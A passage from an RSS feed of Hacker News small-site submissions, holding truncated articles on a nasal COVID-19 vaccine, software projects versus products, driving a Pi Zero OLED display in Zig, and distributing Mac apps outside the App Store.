infection.</p><p><strong>Lesser volume:</strong></p><p>Earlier rabies vaccine used to be given in the subcutaneous fat and now is being given intra-dermal injection route (through the skin). A similar immune response can be generated with a much smaller dose.</p><h3><span><strong>INTERNATIONAL TRIALS</strong></span></h3><p>An influenza vaccine called FLUmist, delivered via the nose, uses the weakend form of live influenza virus but can’t be administered to certain groups including those whose immune systems are compromised by cancer, HIV and diabetes.</p><p>In contrast, the new coronavirus intranasal vaccine does not use a live virus capable of replication, presumably making it safer.</p><p>The United Kingdom's Medicines and Healthcare Products Regulatory Agency (MHRA), has approved Open Orphan and Codagenix to conduct a phase 1 study of its nasal Covid-19 vaccine in the country.</p><p><strong>Also Read | <a href="https://www.indiatoday.in/coronavirus-outbreak/vaccine-updates/story/bharat-biotech-founder-assures-safety-of-covaxin-nasal-vaccine-1755712-2021-01-04" target="_blank" title="Bharat Biotech founder assures safety of Covaxin, pins hopes on its new nasal vaccine">Bharat Biotech founder assures safety of Covaxin, pins hopes on its new nasal vaccine</a></strong></p><p><strong>Also Read | <a href="https://www.indiatoday.in/coronavirus-outbreak/video/covishield-covaxin-vaccines-will-be-available-in-india-soon-health-minister-harsh-vardhan-1756772-2021-01-07">Covishield, Covaxin vaccines will be available in India soon: Health minister Harsh Vardhan</a></strong></p><p><strong>Also Read | <a href="https://www.indiatoday.in/coronavirus-outbreak/story/vaccination-doesn-t-guarantee-100-protection-wearing-mask-is-must-experts-1756766-2021-01-07">Vaccination doesn't guarantee 100% protection, wearing mask is must: Experts</a></strong></p></div></div>]]>
            </description>
            <link>https://www.indiatoday.in/coronavirus-outbreak/story/india-nasal-coronavirus-vaccine-soon-trials-begin-nagpur-1756780-2021-01-07</link>
            <guid isPermaLink="false">hacker-news-small-sites-25685187</guid>
            <pubDate>Fri, 08 Jan 2021 14:45:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software Projects vs. Software Products]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684981">thread link</a>) | @mgc092
<br/>
January 8, 2021 | https://www.romenrg.com/blog/2020/12/30/software-projects-vs-software-products/ | <a href="https://web.archive.org/web/*/https://www.romenrg.com/blog/2020/12/30/software-projects-vs-software-products/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>So, as a developer, you work on software projects, right? …Or are they <em>software products</em>?</p>

<p>As many others in the software industry, you might think those two concepts are synonyms; but they aren’t. In fact, whether the software being developed is considered a project or a product may have critical and non-trivial ramifications, in many aspects.</p>

<p><img src="https://www.romenrg.com/images/products_vs_projects.jpg" alt="Team meeting in which multiple colleagues discuss in a table, where several computres are opened. One man moves hands displaying confusion"></p>

<p>The <em>not-so-subtle</em> differences between software projects and software products actually have a huge impact on our behavior, both from a business as well as from an engineering perspective.</p>

<!-- More -->


<p>For many years I’ve been trying to find the time to write about this key difference, to which many people in tech fail to give importance to. Finally, about a year ago, I gave a <a href="https://www2.slideshare.net/romenrg/agile-software-development-beyond-projects-ull">lecture</a> on this very topic: “software projects vs software products”, in the context of agile software development. And now that my 2020 article is due, I have decided to write about this important topic in more detail.</p>

<h2>Let’s start with some definitions</h2>

<p>If we want to get a clear definition of “project” and “<a href="https://www.pmi.org/about/learn-about-pmi/what-is-project-management">project management</a>”, the Project Management Institute (PMI) can probably be of some help. From their site we can extract two clear sentences that are relevant in this context:</p>

<ul>
<li>A <strong>project</strong> is temporary in that it has a defined beginning and end in time, and therefore defined scope and resources.</li>
<li><strong>Project management</strong>, then, is the application of knowledge, skills, tools, and techniques to project activities to meet the project requirements.</li>
</ul>


<p>Now, if we try to look for definitions of “<a href="https://en.wikipedia.org/wiki/Product_(business)">product</a>” and “<a href="https://en.wikipedia.org/wiki/Product_management">product management</a>”, we can probably summarize them as:</p>

<ul>
<li>A <strong>product</strong> is an object or system made available for consumer use; it is anything that can be offered to a market to satisfy the desire or need of a customer.</li>
<li><strong>Product management</strong>, then, drives the business case for product development and has an active role throughout its development, test and launch; being also involved in product change and lifecycle decisions and planning.</li>
</ul>


<p>Can you tell the key differences already?</p>

<h2>Digging into the differences</h2>

<h3>Two key differences, from definitions</h3>

<p>From the definitions above, we can clearly see the first big difference: the temporary nature of a project. <strong>Projects are time-constrained efforts</strong>, supposed to have a defined beginning and end date. This clearly-defined temporary nature does not apply to products, which don’t have such predefined beginning and end in time, being subject to market demand instead.</p>

<p>Moreover, those clearly defined time boundaries for projects also bring the second clear distinction: fixed scope and resources (i.e. the project requirements). This doesn’t apply to products either. <strong>Products are evolving creatures by nature</strong>. While project management cares about meeting those predefined project requirements; product management cares about the business case for the product, constantly learning from users and having an active role in the product lifecycle, defining new features and/or re-prioritizing work, adapting to market needs.</p>

<h3>Detailed comparison</h3>

<p>When I was preparing my lecture, I found a very nice article by Sriram Narayan in Martin Fowler’s blog. In his article, Sriram added a very comprehensive <a href="https://martinfowler.com/articles/products-over-projects.html#WhatIsProduct-mode">table comparing project-mode and product-mode</a>.</p>

<p>For this article, I have created my own simplified table; focusing only on some key aspects I would like to compare for the two cases.</p>

<table>
<thead>
<tr>
<th>Aspect                                  </th>
<th> Project                                   </th>
<th> Product                                                    </th>
</tr>
</thead>
<tbody>
<tr>
<td><em>Duration</em>                              </td>
<td> Fixed. Limited (e.g. <em>X</em> months).           </td>
<td> Unknown. Depending on market (from <em>X</em> weeks to <em>Y</em> decades).</td>
</tr>
<tr>
<td><em>Scope</em>                                 </td>
<td> Supposedly known and fixed.               </td>
<td> Unknown. Constant learning and adaptation is assumed.</td>
</tr>
<tr>
<td><em>Costs</em>                                 </td>
<td> Supposedly known and fixed.               </td>
<td> “Pay as we go”, i.e. weekly / monthly / yearly (e.g. salaries).</td>
</tr>
<tr>
<td><em>Technical quality</em>                     </td>
<td> Not rewarded; thus, not prioritized. Projects are seen as one-off efforts, so maintainability is not valued. </td>
<td> Critical. Product development is a continuum. Technical excellence is key to keep up the product’s iterative and incremental evolution.</td>
</tr>
<tr>
<td><em>Key mindset aspects</em>                   </td>
<td> Fixed mindset. “We know what we have to build”. So, “just do it”. Don’t question things. </td>
<td> Learning mindset. “We are constantly learning and adapting”. Data-driven. Question decisions constantly.</td>
</tr>
<tr>
<td><em>Key engineering skills</em>                </td>
<td> Framework-specific knowledge. <p> Everything is fixed, from features to technologies. “We just need to write the code as quickly as possible”. </p></td>
<td> <a href="https://github.com/romenrg/evergreen-skills-developers">Evergreen development skills</a>. <p> Everything may change, from features to technology. “We need to learn and adapt constantly”. “We apply technical best practices”. “Teamwork, mentoring and collaboration are key”.</p></td>
</tr>
</tbody>
</table>


<h2>Software development is mainly about building products</h2>

<p><a href="https://www.romenrg.com/blog/2015/09/28/why-asking-developers-for-time-estimates-in-software-projects-is-a-terrible-idea-and-how-to-bypass-it-with-scrum/#the-role-of-evil-contracts">Software development involves many unknowns</a>. Those unknowns make it extremely hard for us to have the certainties “projects” require upfront. At the beginning is when we know the least about the software what we are building.</p>

<h3>In the digital economy, software evolves constantly</h3>

<p>Think of the software you use in your daily life. Isn’t it always evolving? You receive constant updates, not only for bugfixing; but also to add new features, <a href="https://www.romenrg.com/blog/2013/01/02/improving-the-ui-to-achieve-a-better-ux-my-experience-in-stat4you/">improve the UX</a>, or even to remove pieces that are no longer relevant.</p>

<p>Does this fit into the definition of “project” we saw before? Do these applications have “a defined beginning and end in time”? And how about scope and resources, do they seem to have been fixed upfront?</p>

<p>Change and evolution are natural in products, but not in projects. Projects don’t welcome change. And software evolves constantly.</p>

<h3>Software products and outsourcing are not a good fit</h3>

<p>Traditionally, it has been common for non-software organizations to outsource software development initiatives. For instance, Government agencies typically outsource their “software development projects”, even though in most cases they should have been thinking in terms of software products instead.</p>

<p>Think of an e-gov application in which citizens can perform their bureaucratic obligations from home. Isn’t that a software product? It will have to evolve, as new laws are passed. And it is not supposed to have a predefined teardown day. Instead, we would probably expect it to be there for the long run. Over time, citizens (users) will discover bugs, which will have to be addressed; and we will likely complain about it and/or suggest improvements. There might also be scalability issues and/or outages that will have to be tackled.</p>

<p>Treating these software products as outsourced projects means that the owners will hire an external company to build it. Usually the cheapest. The project will have a fixed scope, and the parties will agree on a timeline and on a price. The external company will complete the project, according to those parameters and hand it over to the customer. Then, usually, the external company forgets about it. If changes are desired in the future, new projects will be defined and outsourced. Often to different companies.</p>

<p>In most cases, the company that is hired to build the software is not involved in the discovery process with potential users. They are not involved in the prioritization of features. They are just hired to do X, as quickly and cheaply as possible. And since they are not rewarded for software quality nor for asking questions, they will probably build it without maintenance in their minds. And they won’t question decisions nor worry about gathering data.</p>

<p>Now, think how different it would be if it was treated as a software product, with an in-house team building it and participating in all the process, from conception to evolution. The team would understand needs, motivations and strategic goals; they would be engaged. They would ask questions. Hypotheses could be defined together and data collection and learning would be in everybody’s mind since the beginning. Working in small increments would be easier. Writing maintainable code becomes crucial. Changes are welcome. And quality matters.</p>

<p>Being aware of the importance of software products in the digital economy means that, if your software is (or is becoming) the core of your business, then you keep software development in-house. Nowadays, every company is a software company. Think of Airbnb, Lyft or Netflix. These businesses could have opted to externalize software development, but they realized the software products they were building are the core of their business. They realized they were software companies.</p>

<h3>How about open source “projects”?</h3>

<p>It is common in the software industry to hear people refer to “open source projects”. In most cases, though, I would argue we should be talking about “open source products” instead.</p>

<p>I have been an open source software (OSS) user for many years, and I have also contributed to open source myself. One example of OSS to which I have contributed is <a href="http://jenkins.io/">Jenkins</a>. Jenkins is the leading open source automation server. It has been around for more than 15 years, with millions of installations worldwide. And it has evolved significantly, including the fork from Hudson, the recent UI changes, and the thousands of ever-evolving plugins, created by a thriving open source community. Based on this data and the previous definitions, should we consider Jenkins an “open source project” or, rather, an “open source product”?</p>

<p>I understand that, when somebody (like Kohsuke with Jenkins) starts to build an open source software, they might have a limited and well defined idea. And they may work on a “project” to make it happen. A project to build the first set of fixed features for their idea. But then, if it is successful, that initial project leads to a product that keeps evolving in unanticipated ways. Scope is no longer fixed, as the community starts to bring new ideas and prioritize their development; and there is no defined “end date”.</p>

<p>Successful open source “projects” are here to stay, for a long time. But their success will keep them evolving within …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.romenrg.com/blog/2020/12/30/software-projects-vs-software-products/">https://www.romenrg.com/blog/2020/12/30/software-projects-vs-software-products/</a></em></p>]]>
            </description>
            <link>https://www.romenrg.com/blog/2020/12/30/software-projects-vs-software-products/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684981</guid>
            <pubDate>Fri, 08 Jan 2021 14:24:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gettin' Ziggy with It on the Pi Zero]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684837">thread link</a>) | @jorangreef
<br/>
January 8, 2021 | https://www.kamelasa.dev/programming/gettin-ziggy-with-it-pi-zero/ | <a href="https://web.archive.org/web/*/https://www.kamelasa.dev/programming/gettin-ziggy-with-it-pi-zero/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <header>
          <p><a href="https://www.kamelasa.dev/">kamelåså</a>
            <span>special topics in calamity something or other</span>
          </p>
        </header>
        
      </div>
    </div><div><article>
    

    <section>
        <p>Alright, you can read the article first and shoot me later for a title like that, and what will inevitably become a series of Zig-based puns.</p>
<p>Zig, for the unaware, is a fancy language that looks to be to C what Rust is to C++. Honestly, I recommend you read the summary on the main page<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a> to find out more yourself, as the best I can do is to just parrot what has already been written. However, you can see it as a valid <em>alternative</em> to C and Zig itself has claimed that it wants to be a better version of C than C itself. An ambitious challenge, for sure. To that end, Zig itself ships its own C compiler.</p>
<p>I’ve been interested in giving Zig a spin for quite a while, and once my Raspberry Pi Zero W<a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a> and OLED display<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a> arrived in the post, I decided that this would be my best opportunity to try it out. I’m not really going to cover the process of wiring up the hardware, suffice to say that once you’ve got your Pi Zero you’ll need to be able to SSH into it, and that you’ll need a [solderless] GPIO header<a href="#fn4" id="fnref4" role="doc-noteref"><sup>4</sup></a> to plug the OLED display into. I recommend the Zero <strong>W</strong> because the W means ‘WiFi’, which means that if you connect it to your network you can SSH in without faffing around with USB cables and what not. It’s not a requirement, though.</p>
<p>With that out of the way, let’s see if we can write something in Zig to power this little display. It’s going to be a simple program that simply fills the entire screen by turning the pixels from black (off) to white (on). As an extra challenge, we will do this without pulling in dependencies like WiringPi<a href="#fn5" id="fnref5" role="doc-noteref"><sup>5</sup></a>, or relying on existing drivers, as lovely as they are.</p>
<p>Instead, we will be directly using the i<sup>2</sup>c dev interface<a href="#fn6" id="fnref6" role="doc-noteref"><sup>6</sup></a>. If you’re using Debian and/or Ubuntu on your Pi and your own machine, you can grab these libraries with a simple <code>sudo apt install i2c-dev</code>. You will need to enable i<sup>2</sup>c on your Pi separately though, through <code>sudo raspi-config</code><a href="#fn7" id="fnref7" role="doc-noteref"><sup>7</sup></a>.</p>
<p>Ready to… get Ziggy with it? Oh, I bet you are. 😋 If you want to skip to the end and just grab the code, though, you can find this all on GitHub<a href="#fn8" id="fnref8" role="doc-noteref"><sup>8</sup></a>. I called it Stardust, like <em>Zig</em>gy Stardust. Get it?</p>
<p>🥁</p>
<hr>
<h2 id="hello-pi.">Hello, Pi.</h2>
<p>The first and most complicated part of any low-level project is the bit where you try and establish a build system of some sorts. We’re going to forget about that completely for now and apply some elbow-grease to the situation.</p>
<p>The next step is to define a <code>main</code> function that grabs a file descriptor (or handle) corresponding to our OLED display. According to the aforementioned dev interface docs, we’ll need to open a file and check it with <code>ioctl</code>.</p>
<pre><code>const std = @import("std");

const c = @cImport({
  @cInclude("linux/i2c.h");
  @cInclude("linux/i2c-dev.h");
  @cInclude("sys/ioctl.h");
});

const i2c_device = "/dev/i2c-1"; // this is assumed correct on a Pi Zero, but may be i2c-0 on an older Pi.
const i2c_addr: c_int = 0x3c; // this is typed as a C-style int for ABI compatibility with C

pub fn main() !void {
  const stdout = std.io.getStdOut().outStream();

  const fd = try fs.openFileAbsolute(i2c_device, fs.File.OpenFlags{ .write = true, .read = true });
  defer fd.close();

  if (c.ioctl(fd.handle, c.I2C_SLAVE, i2c_addr) &lt; 0)) {
    try stdout.print("ioctl failed, errno: {}\n", c.errno);
  }

  stdout.print("Init successful.\n", .{});
}</code></pre>
<p>You might have noticed something odd: we’re not really writing much Zig here, it’s practically 95% interop with C. The beauty of Zig is that this interop is so simple and intuitive that it’s the <em>easiest</em> way to get started if you’re going to be linking against existing C libraries. Get the software working first, abstract it later, as they say, and you might already start to get an idea of what we could convert into idiomatic Zig libraries in future.</p>
<p>The actual Zig code you see though, is quite different to the C stuff. That <code>defer fd.close()</code>, for example, <em>ensures</em> that the file descriptor we opened up will be closed when we’re done. If we don’t do that, then it’ll stay open and there’ll be a leak.</p>
<p>There’s also the <code>try</code> macro, used in combination with the <code>!void</code> return type, which will be super familiar if you’ve written some Rust and have dealt with option types. It’s short hand for executing the code and catching/dealing with the error, with <code>!void</code> being another shorthand for <code>anyerror!void</code>, namely: this function returns either nothing, or an error if there is one.</p>
<p>WHat we’ve actually done, however, is open the device file <code>/dev/i2c-1</code>, and then used the <code>ioctl</code> library to specify which device in particular we want to talk to. You can find out this value by running <code>i2cdevice -y 1</code>, like so:</p>
<pre><code>pi@raspberrypi:~ $ i2cdetect -y 1
     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f
00:          -- -- -- -- -- -- -- -- -- -- -- -- --
10: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
20: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
30: -- -- -- -- -- -- -- -- -- -- -- -- 3c -- -- --
40: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
50: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
60: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
70: -- -- -- -- -- -- -- --</code></pre>

<p>We’re at a good point now to try and compile this thing and then run it on the Pi. If we get the message ‘Init successful.’ then we’re golden.</p>
<hr>
<h2 id="build-and-push">Build and Push</h2>
<p>Zig comes with a nice little build system out of the box, but we’re not going to use it right now because it’s a work in progress. I’ll leave that as an exercise to you, the reader, and I urge you to contribute any documentation you come up with to Zig. Instead, we’ll use the CLI which is just as powerful and, gracefully, a bit more discoverable for our purposes.</p>
<p>Are you writing this code on the Pi itself? Probably not, I imagine, and nor do you need to.</p>
<blockquote>
<p>Cross-compiling is a first-class use case</p>
<p>Andrew Kelley, Creator of Zig</p>
</blockquote>
<p>Let’s build a binary, then. Save your code into a file, say, <code>stardust.zig</code> and then proceed.</p>
<pre><code>zig build-exe stardust.zig  -target arm-linux-musleabihf -mcpu arm1176jzf_s -O ReleaseSafe -lc</code></pre>
<p>To unpack that a little, the <code>target</code> is a triplet stating that we want to build this using the musl<a href="#fn9" id="fnref9" role="doc-noteref"><sup>9</sup></a> libc ABI, on a 32bit ARM architecture. <code>mcpu</code> goes along with that to make sure the resulting binary will work on our Pi Zero. I grabbed these values from an issue on Zig’s github repo<a href="#fn10" id="fnref10" role="doc-noteref"><sup>10</sup></a>, so credit goes to the author of that issue for unintentionally guiding me forward.</p>
<p>Passing the optimiser flag (<code>-O</code>) isn’t strictly necessary, so you can omit this if you require a debug build and stack traces with errors.</p>
<p><code>-lc</code> basically says that this binary needs to be linked against libc.</p>
<p>Once the build finishes, you should find a shiny new executable called <code>stardust</code> in the same directory as your code. You can get it onto your Pi with <code>scp</code>, like so:</p>
<pre><code>scp stardust pi@raspberrypi:~/stardust</code></pre>

<p>SSH into your Pi after that, and try and run it! Does it return successfully? I hope so!</p>
<p>Let’s move on and make this kitten purr. Meow 🐈.</p>
<hr>
<h2 id="getting-this-show-on-the-road">Getting this show on the road</h2>
<p>In true <em>draw the rest of the fucking owl</em> fashion<a href="#fn11" id="fnref11" role="doc-noteref"><sup>11</sup></a>, what follows is a bit of a code-dump since the primary method of communicating with your OLED display is to, literally, write a few bytes to a file. The registers available and what can be written to them are often described in a meticulously detailed datasheet<a href="#fn12" id="fnref12" role="doc-noteref"><sup>12</sup></a>, but they’re not exactly light reading and we can save a bit of time by grabbing the info from elsewhere. A lot of the constants that follow are gracefully derived from those listed in a certain <code>owenosborn</code>’s wiringPi-based driver.<a href="#fn13" id="fnref13" role="doc-noteref"><sup>13</sup></a>. Credit where credit’s due, eh.</p>
<pre><code>const SET_CONTRAST = 0x81;
const SET_DISPLAY_ALL_ON_RESUME = 0xA4;
const SET_DISPLAY_ALL_ON = 0xA5;
const SET_NORMAL_DISPLAY = 0xA6;
const SET_INVERT_DISPLAY = 0xA7;
const SET_DISPLAY_OFF = 0xAE;
const SET_DISPLAY_ON = 0xAF;
const SET_DISPLAY_OFFSET = 0xD3;
const SET_COLUMN_ADDR = 0x21;
const SET_PAGE_ADDR = 0x22;
const SET_COM_PINS = 0xDA;
const SET_VCOM_DETECT = 0xDB;
const SET_DISPLAY_CLOCK_FREQ = 0xD5;
const SET_PRECHARGE = 0xD9;
const SET_MULTIPLEX_RATIO = 0xA8;
const SET_LOW_COLUMN = 0x00;
const SET_HIGH_COLUMN = 0x10;
const SET_START_LINE = 0x40;
const SET_START_PAGE = 0xB0;
const SET_MEMORY_MODE = 0x20;
const SET_COM_SCAN_INC = 0xC0;
const SET_COM_SCAN_DEC = 0xC8;
const SET_SEG_REMAP = 0xA0;
const SET_CHARGE_PUMP = 0x8D;</code></pre>
<p>The registers available to an i<sup>2</sup>c compatible device will depend on the device itself, so it’s not really safe to copy and paste these without knowing exactly what you’re dealing with. This is driver level code so it’s not like you’ll get some fancy validation error if you write the wrong bytes, you’ll more likely fuck it up and burn down your house<a href="#fn14" id="fnref14" role="doc-noteref"><sup>14</sup></a>.</p>
<p>Next we’ll want to init the display and get it into a clean state, with the cursor pointing at the first pixel.</p>
<pre><code>fn init_display(fd: fs.File) !void {
    const cmds = [_]u8{
        SET_MULTIPLEX_RATIO, 0x3F,                   0x00,
        SET_START_LINE,      SET_SEG_REMAP,          SET_COM_SCAN_DEC,
        SET_COM_PINS,        0x32,                   SET_DISPLAY_ALL_ON_RESUME,
        SET_NORMAL_DISPLAY,  SET_DISPLAY_CLOCK_FREQ, 0x80,
        SET_CHARGE_PUMP,     0x14,                   SET_MEMORY_MODE,
        0x20,
    };

    inline for (cmds) |cmd| {
        _ = try fd.write(&amp;[2]u8{ 0x00, cmd });
    }
}

fn display_off(fd: fs.File) !void {
    _ = try fd.write(&amp;[2]u8{ 0x00, SET_DISPLAY_OFF });
}

fn display_on(fd: fs.File) !void {
    _ = try fd.write(&amp;[2]u8{ 0x00, SET_DISPLAY_ON });
}

fn reset_cursor(fd: fs.File) !void {
    const cmds = [_]u8{
        SET_COLUMN_ADDR,
        0x00,
        0x7F,
        SET_PAGE_ADDR,
        0x00,
        0x07,
    };

    inline for (cmds) |cmd| {
        _ = try fd.write(&amp;[2]u8{ 0x00, cmd });
    }
}</code></pre>
<p>Wow, actual Zig code! The formatting may look a little odd because that’s what <code>zig fmt</code> decides is appropriate.</p>
<p><code>init_display</code> is quite a complex beast that issues a whole series of commands that sets up the display for further use. A more …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.kamelasa.dev/programming/gettin-ziggy-with-it-pi-zero/">https://www.kamelasa.dev/programming/gettin-ziggy-with-it-pi-zero/</a></em></p>]]>
            </description>
            <link>https://www.kamelasa.dev/programming/gettin-ziggy-with-it-pi-zero/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684837</guid>
            <pubDate>Fri, 08 Jan 2021 14:07:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing Dependent Types: a minimalistic tutorial]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684760">thread link</a>) | @matt_d
<br/>
January 8, 2021 | https://tiarkrompf.github.io/notes/?/dependent-types/ | <a href="https://web.archive.org/web/*/https://tiarkrompf.github.io/notes/?/dependent-types/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://tiarkrompf.github.io/notes/?/dependent-types/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684760</guid>
            <pubDate>Fri, 08 Jan 2021 13:59:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Distributing Mac apps outside the App Store, a quick start guide]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684705">thread link</a>) | @tosh
<br/>
January 8, 2021 | https://rambo.codes/posts/2021-01-08-distributing-mac-apps-outside-the-app-store | <a href="https://web.archive.org/web/*/https://rambo.codes/posts/2021-01-08-distributing-mac-apps-outside-the-app-store">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>The Mac has always been very different from its close relative, iOS, especially when it comes to what a user is or is not allowed to run on their system. Even with the introduction of Apple Silicon, Apple <a href="https://developer.apple.com/videos/play/wwdc2020/10686/?t=1161">has made it very clear</a> that the Mac is still the Mac, and is still <em>hackable</em>, even when running on the new architecture.</p><p>What this means for us developers is that, when targeting the Mac platform, we have choices: we can distribute our apps independently, outside the Mac App Store, through the Mac App Store exclusively, or through both at the same time.</p><p>This article is my brain dump on the subject. It is meant to be a guide on the things that you’ll need to know about when distributing a Mac app outside the App Store, rather than a how-to tutorial. My hope is that having everything listed here will help demystify the process for beginners, and the descriptions of my own process will be useful as starting points.</p><h2>App Store x Direct: pros and cons</h2><p>All of these choices come with their pros and cons, and depending on which type of Mac app you’re making, you might not be able to have it in the Mac App Store to begin with. An example of that is my app <a href="https://v2.airbuddy.app/">AirBuddy</a> which, in order to provide deep integration with Apple’s wireless devices, needs to run a system agent and use some private APIs, which would never be allowed in the App Store. The same goes for many other types of apps which simply wouldn’t work with the restrictions of the Mac’s sandbox.</p><p>For those who do have that choice, I’ve compiled a list of what I believe to be the pros and cons between shipping through the Mac App Store or shipping directly.</p><h3>Mac App Store pros</h3><ul><li>Apple handles the distribution, billing and licensing for you</li><li>The app is easier to find and install for most users</li><li>Potential to get featured by Apple and reach more customers</li><li>Can use features such as Sign in With Apple which are not available for apps distributed outside the Mac App Store</li></ul><h3>Mac App Store cons</h3><ul><li>Have to pay a 15% or 30% cut of all sales to Apple, <a href="https://developer.apple.com/app-store/small-business-program/">depending on how much you make in a year across all apps</a></li><li>Every single update, no matter how minor, has to go through App Review and has the potential of being rejected for arbitrary and random reasons</li><li>Can’t unlock the full potential of macOS because of the strict sandboxing requirements</li><li>Can’t do paid upgrades</li></ul><h3>Direct distribution pros</h3><ul><li>Ship updates whenever you want, no need to wait for them to be reviewed and no fear of random rejections</li><li>Unlock the full potential of macOS with system extensions, daemons, no sandboxing, private API, and more</li><li>Keep a higher percentage of your sales</li><li>Do paid upgrades or other business models which are not allowed in the App Store</li><li>Live without the constant fear that your app will suddenly become a problem for Apple and be threatened with removal from the App Store</li></ul><h3>Direct distribution cons</h3><ul><li>Have to handle licensing, distribution, and updates (it’s not that hard, you’ll see)</li><li>Not as easy to do consumable or non-consumable in-app purchases (no StoreKit)</li><li>Can’t use some Apple services such as Sign in With Apple (others such as CloudKit still work just fine)</li></ul><h2>A note on Catalyst and SwiftUI</h2><p>With the introduction of Catalyst, we’re now seeing many new Mac apps being released, since it’s a lot easier to take an existing iPad app and turn it into a Mac app. Apps ported to macOS through Catalyst are not required to be released in the App Store, even if their counterpart on iOS is.</p><p>Additionally, there is currently no TestFlight for macOS (one of my wishes for 2021), so if you’d like to distribute beta builds of a Catalyst app, you’ll have to do that outside the Mac App Store, and it is not that different from distributing a production app.</p><p>A lot of what I’m presenting here will also apply for Catalyst apps — they’re Mac apps, after all — but some might require additional hacking in order to work around the fact that Apple doesn’t want you to use the entirety of AppKit directly from within a Catalyst app. With a bit of work though, you can make a Catalyst app very Mac-capable, including <a href="https://www.highcaffeinecontent.com/blog/20190607-Beyond-the-Checkbox-with-Catalyst-and-AppKit">support for AppleScript</a> and other features.</p><p>For SwiftUI apps targeting the Mac, there should be no major differences with the distribution process, since you can use all features of the macOS API in a SwiftUI app without requiring a lot of hacking like it does for Catalyst apps.</p><h2>Distribution</h2><p>Distribution of an app involves two parts: actually uploading, storing and serving the app binary and its updates somewhere, and also producing the right package that will work for your users.</p><h3>Hosting</h3><p>The first major step with getting your Mac app in the hands of users without the App Store is to figure out how to distribute its binary. No App Store means that you’ll have to host your app’s binaries and updates somewhere on the internet and provide a link for your users to download it.</p><p>There are several ways you can go about this. For an open-source app, you can use Github releases and even host your app’s update feed in the Github repo. That’s how I distribute the <a href="https://github.com/insidegui/WWDC/releases">WWDC app for macOS</a>.</p><p>For my commercial apps, I’ve been using <a href="https://www.backblaze.com/b2/cloud-storage.html">Backblaze B2</a> for storage of both the app binaries, delta updates and update feed, and proxying all requests through <a href="https://www.cloudflare.com/">Cloudflare</a> so that I can have a custom domain for the downloads/updates and also add filtering, caching and logic on the server if needed.</p><p>B2 is an extremely affordable provider (I rarely pay over US$1 in a month). Most Mac apps are not that large in size, so even if your app is downloaded a lot, it’s unlikely that you’ll end up having to pay a lot of money for storage/bandwidth. Another popular option is using <a href="https://aws.amazon.com/s3/">Amazon S3</a> buckets, but their control panel gives me nightmares so I prefer to use B2 which is a lot simpler (and less expensive).</p><p>I haven’t automated the publishing step for my app releases as of yet, so to upload a new release I just use <a href="https://panic.com/transmit/">Transmit</a> as a client for my B2 buckets. Speaking of that, before we even get to upload a release to whatever provider we’ve chosen, there’s a very important step: getting the right file to put out there.</p><h3>Notarization and packaging</h3><p>When exporting an archived app from within Xcode, we get two main options for distribution: App Store Connect and Developer ID. To distribute apps without the App Store, you’re going to be using Developer ID.</p><p>The same developer account you use for distributing apps to the Mac App Store can be used to sign your apps for Developer ID distribution. The certificate itself is different, but Xcode will auto-generate and install one for you during the process of exporting the archive if you haven’t done so yet.</p><p>Since macOS Catalina, all apps distributed directly to users must be notarized by Apple, otherwise they won’t launch by default. This process uploads your app to Apple, which will then run automated malware checks and “staple” your binary with a special signature that will allow it to run. This is not App Review, it’s an automated check to prevent malware from being distributed through this method, and it is also a way for Apple to flag a single binary for malware, instead of a developer’s entire account, should it become compromised at some point.</p><p>Whether or not you notarize the binary directly from within the Xcode organizer will depend on which packaging method you’ll be using to distribute your app. We can’t just upload a <code>.app</code> directory to a server and let users download that, we have to turn it into a flat file. The simple way to do that is to just zip the app and distribute it as a zip file, but I’ve found through experience that distributing the app as a DMG file reduces support requests by quite a bit.</p><p>You’ve probably seen DMGs before when downloading Mac apps. They’re disk images that are mounted by macOS when double-clicked in Finder, and they can also provide some artwork instructing the user to drag the app into their Applications folder. This makes it easy for a user to figure out what to do, and it also reduces the chances that a given user will be running your app from their Downloads folder or some other random place like that.</p><p>If you’re going to be distributing your app as a DMG, you should just export it using the Developer ID option in Xcode, without notarization, then notarize the DMG itself. There’s no option in Xcode to export a DMG, so you’ll have to use a third-party tool. The one I like to use is <a href="https://github.com/sindresorhus/create-dmg">create-dmg</a>. I’ve also created and open-sourced <a href="https://github.com/insidegui/dmgdist">dmgdist</a>, a tool that automates the process of creating, uploading and stapling the DMG so that you can get the image ready to be distributed by running a single command.</p><p>To distribute the app as a zip file, the process is simpler: pick the upload option from Xcode after selecting “Developer ID” and it’ll produce a notarized version of your app, which you can then zip up and distribute directly.</p><h2>App updates</h2><p>Another aspect of the App Store is that it also handles app updates. Whenever we upload a new version to App Store Connect and it gets approved, users receive the update in the App Store. For apps distributed directly, we need to replicate that somehow.</p><p>The best way to do that — 